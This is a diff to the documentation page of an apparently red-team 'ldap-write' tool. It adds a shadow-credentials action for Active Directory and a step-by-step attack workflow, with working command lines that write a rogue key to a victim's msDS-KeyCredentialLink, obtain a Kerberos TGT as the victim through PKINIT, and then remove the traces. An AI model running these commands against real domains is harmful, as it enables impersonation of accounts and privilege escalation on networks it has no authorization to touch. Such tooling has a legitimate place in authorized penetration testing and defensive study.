@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Modify Active Directory objects via LDAP. Add or remove group members, set or delete attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts (for RBCD attacks), and delete objects. Complements `ldap-query` by adding write capabilities for post-compromise AD manipulation.
+Modify Active Directory objects via LDAP. Add or remove group members, set or delete attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts (for RBCD attacks), shadow credentials (msDS-KeyCredentialLink), and delete objects. Complements `ldap-query` by adding write capabilities for post-compromise AD manipulation.
 
 ## Arguments
 
@@ -42,6 +42,8 @@ Modify Active Directory objects via LDAP. Add or remove group members, set or de
 | delete-object | Delete an AD object (cleanup after RBCD) | target |
 | set-rbcd | Configure RBCD delegation (auto-builds security descriptor) | target, value |
 | clear-rbcd | Remove RBCD delegation from an object | target |
+| shadow-cred | Write KEY_CREDENTIAL to msDS-KeyCredentialLink for PKINIT auth | target |
+| clear-shadow-cred | Remove all shadow credentials from an object | target |
 
 ## Usage
 
@@ -93,6 +95,16 @@ ldap-write -action clear-rbcd -server dc01 -target victimserver -username user@d
 **Delete an object (cleanup):**
 ```
 ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username admin@domain.local -password pass
+```
+
+**Add shadow credential (for PKINIT authentication):**
+```
+ldap-write -action shadow-cred -server dc01 -target victim -username admin@domain.local -password pass
+```
+
+**Clear shadow credentials (cleanup):**
+```
+ldap-write -action clear-shadow-cred -server dc01 -target victim -username admin@domain.local -password pass
 ```
 
 ## Example Output
@@ -153,6 +165,29 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
    ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username user@domain.local -password pass
    ```
 
+## Shadow Credentials Attack Workflow
+
+Shadow Credentials abuse msDS-KeyCredentialLink to add a rogue public key, enabling PKINIT certificate-based authentication as the target:
+
+1. **Write shadow credential** (requires GenericWrite or WriteProperty on msDS-KeyCredentialLink):
+   ```
+   ldap-write -action shadow-cred -server dc01 -target victim -username attacker@domain.local -password pass
+   ```
+
+2. **Save the output certificate and key** to files (`cert.pem` and `key.pem`)
+
+3. **Use PKINIT to get a TGT** (with external tools like PKINITtools or Certipy):
+   ```
+   python3 gettgtpkinit.py domain.local/victim -cert-pem cert.pem -key-pem key.pem out.ccache
+   ```
+
+4. **Cleanup** — remove the shadow credential:
+   ```
+   ldap-write -action clear-shadow-cred -server dc01 -target victim -username attacker@domain.local -password pass
+   ```
+
+{{% notice info %}}Requires Windows Server 2016+ domain functional level with Key Trust enabled.{{% /notice %}}
+
 ## Operational Notes
 
 - Uses `go-ldap/v3` for LDAP add/modify/delete operations
@@ -173,3 +208,4 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
 - **T1098.005** — Account Manipulation: Device Registration
 - **T1134.001** — Access Token Manipulation: Token Impersonation/Theft
 - **T1136.002** — Create Account: Domain Account
+- **T1556.006** — Modify Authentication Process: Multi-Factor Authentication
